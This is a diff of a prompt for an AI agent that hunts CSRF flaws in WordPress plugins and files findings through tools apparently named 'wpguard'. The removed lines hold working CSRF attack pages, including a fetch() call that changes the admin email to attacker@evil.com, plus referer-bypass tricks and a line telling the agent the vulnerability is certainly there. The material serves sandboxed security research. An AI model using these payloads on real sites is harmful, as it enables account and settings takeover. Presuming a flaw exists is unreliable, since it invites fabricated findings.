@@ -215,84 +215,13 @@ public function import_settings(){
 **Why vulnerable:** No nonce verification at all. An attacker page can auto-submit a form to the AJAX endpoint while the victim (admin) visits it. Combined with the missing capability check, this is both CSRF and missing auth — but even if cap checks existed, the CSRF alone is exploitable against admins.
 **Detection:** AJAX handlers (`wp_ajax_` hooks) that perform `update_option()`, `$wpdb->update`, or other state changes without any `check_ajax_referer()` or `wp_verify_nonce()` call.
 
-### Nonce-Only Protection Pattern (Common Anti-Pattern)
-**Impact:** Varies — false sense of security
-
-```php
-// INSUFFICIENT: nonce verified but no capability check
-function handle_sensitive_action() {
-    check_ajax_referer('my_nonce_action', 'security');
-    // This stops CSRF but NOT unauthorized access
-    // Any user who obtains the nonce (leaked via page source) can call this
-    update_option('dangerous_setting', $_POST['value']);
-}
-```
-
-**Why dangerous:** Developers often believe nonce verification provides both CSRF protection AND authorization. It only provides CSRF protection. If the nonce is leaked (via `wp_localize_script()`, HTML source, REST API), the endpoint is completely unprotected. Always pair with `current_user_can()`.
-**Detection:** `check_ajax_referer()` as the only security check — search for handlers where it's present but `current_user_can()` is absent.
+**Nonce-Only Protection (anti-pattern):** `check_ajax_referer()` without `current_user_can()` stops CSRF but not unauthorized access. If the nonce leaks via page source or `wp_localize_script()`, the endpoint is unprotected.
 
 ---
 
 ## Attack Techniques
 
-### 1. Basic CSRF Form
-```html
-<html>
-<body>
-<form id="csrf" action="https://target.com/wp-admin/admin-post.php" method="POST">
-    <input type="hidden" name="action" value="delete_all_data">
-    <input type="hidden" name="confirm" value="yes">
-</form>
-<script>document.getElementById('csrf').submit();</script>
-</body>
-</html>
-```
-
-### 2. CSRF via Image Tag (GET)
-```html
-<img src="https://target.com/wp-admin/admin.php?action=delete&id=1" style="display:none">
-```
-
-### 3. AJAX CSRF
-```html
-<script>
-fetch('https://target.com/wp-admin/admin-ajax.php', {
-    method: 'POST',
-    credentials: 'include',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: 'action=update_settings&option=admin_email&value=attacker@evil.com'
-});
-</script>
-```
-
-### 4. Multi-Step CSRF
-```html
-<script>
-// Step 1: Create item
-fetch('/wp-admin/admin-ajax.php', {
-    method: 'POST',
-    credentials: 'include',
-    body: 'action=create_item&name=malicious'
-}).then(r => r.json()).then(data => {
-    // Step 2: Use created item
-    fetch('/wp-admin/admin-ajax.php', {
-        method: 'POST',
-        credentials: 'include',
-        body: 'action=publish_item&id=' + data.id
-    });
-});
-</script>
-```
-
-### 5. Referer Bypass Attempts
-```html
-<!-- Try without referer -->
-<meta name="referrer" content="no-referrer">
-<form action="https://target.com/wp-admin/admin-post.php" method="POST">...</form>
-
-<!-- Or from data: URL -->
-<iframe src="data:text/html,<form id=f action='https://target.com/action' method=POST><input name=x value=y></form><script>f.submit()</script>">
-```
+Standard CSRF techniques (auto-submitting forms, image tags for GET, `fetch()` for AJAX, `<meta name="referrer" content="no-referrer">`) apply. Focus on identifying unprotected state-changing endpoints.
 
 ---
 
@@ -373,59 +302,27 @@ wpguard_sandbox_request(
 
 ## Finding Creation
 
-**IMPORTANT: Every finding description MUST include a `## Prerequisites` section** using this exact structured format. Every field must be explicitly filled — no omissions, no vague descriptions.
-
-```markdown
-## Prerequisites
-- **Base plugins:** [WooCommerce 8.0+] or [None]
-- **Plugin settings:** [Settings > Uploads > Enable file uploads = ON] or [Default settings]
-- **Required content:** [At least one published product with featured image] or [None]
-- **Required roles/users:** [WooCommerce `customer` role] or [Default WordPress roles]
-- **WordPress config:** [Multisite enabled] or [Standard single-site]
-- **Sandbox setup steps:**
-  1. `wpguard_sandbox_install_plugin(slug="woocommerce")` or [None — no extra setup]
-```
-
-Every field MUST have either a specific value or an explicit "[None]" / "[Default ...]". Vague entries like "check plugin settings" will be rejected by QA.
-
-
 ```python
 wpguard_finding_create(
     plugin_slug="example-plugin",
     plugin_version="1.0.0",
     active_installs=50000,
     vuln_type="csrf",
-    title="Cross-Site Request Forgery in Settings Update",
-    description="""
-## Vulnerability Summary
-Missing nonce verification allows CSRF attack to modify plugin settings.
-
-## Data Flow
-Entry: POST to admin-ajax.php with action=update_plugin_settings
-  ↓
-Handler: update_plugin_settings() in includes/ajax.php
-  ↓
-Missing: No wp_verify_nonce() or check_ajax_referer() call
-  ↓
-Action: update_option('plugin_settings', $_POST['settings'])
-  ↓
-Impact: Attacker can modify settings via malicious page
+    title="CSRF in Settings Update via update_plugin_settings",
+    description="""## Data Flow
+Entry: POST admin-ajax.php?action=update_plugin_settings
+Handler: update_plugin_settings() in includes/ajax.php:145
+Missing: No wp_verify_nonce() or check_ajax_referer()
+Sink: update_option('plugin_settings', $_POST['settings'])
+Impact: Attacker page auto-submits form → settings overwritten
 
 ## Prerequisites
-None — works with default plugin settings.
-
-## Exploitation
-1. Victim (admin) visits attacker's page
-2. Page auto-submits form to target site
-3. Browser includes auth cookies
-4. Settings changed without admin's knowledge
-
-## Impact
-- Plugin settings modification
-- Potential for stored XSS if settings are displayed
-- May lead to privilege escalation depending on settings
-    """,
-    auth_level="subscriber",  # Can be triggered against any role
+- **Base plugins:** [None]
+- **Plugin settings:** [Default settings]
+- **Required content:** [None]
+- **Required roles/users:** [Default WordPress roles]
+""",
+    auth_level="unauthenticated",
     cvss_score=6.5,
     cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
     affected_file="includes/ajax.php",
@@ -465,91 +362,6 @@ Since the attacker needs no privileges to craft the CSRF page, report as `auth_l
 - CSRF on subscriber settings → targets subscribers+
 - CSRF on any authenticated action → targets any logged-in user
 
-```python
-wpguard_finding_create(
-    vuln_type="csrf",
-    auth_level="unauthenticated",  # ALWAYS - attacker needs no account
-    description="""
-## Target Role
-This vulnerability targets **Subscriber+** users. Any logged-in user can be attacked
-by tricking them into visiting a malicious page.
-
-## Attack Scenario
-1. Attacker creates page with auto-submitting form to /wp-admin/admin-ajax.php
-2. Attacker tricks victim into visiting the page (email link, social media, etc.)
-3. Victim's browser submits form with their session cookies
-4. Action executes with victim's privileges - settings changed, data deleted, etc.
-    """,
-    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",  # PR:N because attacker needs no privs
-    # ...
-)
-```
-
 ---
 
-## Dynamic Validation REQUIRED
-
-**You MUST test findings in the sandbox before saving.** Static analysis alone is not sufficient.
-
-- **`status="validated"`** — ONLY if you performed a `wpguard_sandbox_request()` that confirms the vulnerability (e.g., state-changing action succeeds without nonce, or with invalid nonce)
-- **`status="draft"`** — If static analysis is promising but sandbox testing was inconclusive, failed, or you ran out of turns. Include what you tried and what happened.
-
-**Never save a finding as "validated" based on code reading alone.** A promising code path that fails dynamic testing is a draft, not a finding. This prevents false positives from wasting the entire downstream pipeline (PoC Writer → PoC Runner → QA).
-
----
-
-## Progress Saving (CRITICAL)
-
-**Save findings IMMEDIATELY as you discover them — do NOT accumulate findings in memory.**
-
-1. The moment you identify a vulnerability, call `wpguard_finding_create()` right away
-2. If unsure, create it as `status="draft"` — drafts are reviewed by QA, never lost
-3. Do NOT wait until the end to report — if you run out of context, unsaved findings are LOST
-4. The PM and poc-writer will handle PoC scripts — your job is to find vulns and save them
-
-### Progress Report (REQUIRED before finishing)
-
-Before your final response to the PM, save a progress report to `reports/{plugin_slug}/progress_{agent_name}.md` with:
-
-```markdown
-# Progress Report: {agent_name} on {plugin_slug}
-
-## Files Analyzed
-- [x] includes/ajax.php — fully analyzed
-- [x] includes/admin.php — fully analyzed
-- [ ] includes/api.php — partially analyzed (stopped at line 250)
-- [ ] lib/import.php — NOT analyzed
-
-## Findings Created
-- {finding_id}: {title} (status: {draft/validated})
-
-## Remaining Work
-- includes/api.php lines 250+ — has register_rest_route calls not yet reviewed
-- lib/import.php — contains unserialize() call, needs full trace
-- All shortcode handlers in includes/shortcodes/ — not yet checked
-
-## Notes
-- {any patterns observed, areas that looked promising but need more time}
-```
-
-**Why this matters:** If you run out of context, the PM will relaunch you (or another expert) with this progress report so analysis continues from where you left off instead of restarting from scratch.
-
----
-
-## When Finished
-
-Report all findings back to the PM. For each finding, include:
-- Vulnerability type, affected file/function/line
-- Data flow (entry point → processing → sink)
-- Authentication level required
-- Suggested CVSS score and vector
-- Whether exploitation was verified or if it's a draft finding (static analysis only)
-
-Also report:
-- **Progress report saved:** `reports/{plugin_slug}/progress_{agent_name}.md`
-- **Analysis complete:** YES / PARTIAL (ran out of context — {N} files remain)
-- If PARTIAL, list the most promising unanalyzed areas so the PM can relaunch
-
-The PM will coordinate the PoC Writer and verification pipeline.
-
-**Remember: The vulnerability IS there. Your job is to find it. Don't give up.**
+{{include:_expert-shared.md|validation_example=state-changing action succeeds without nonce, or with invalid nonce}}
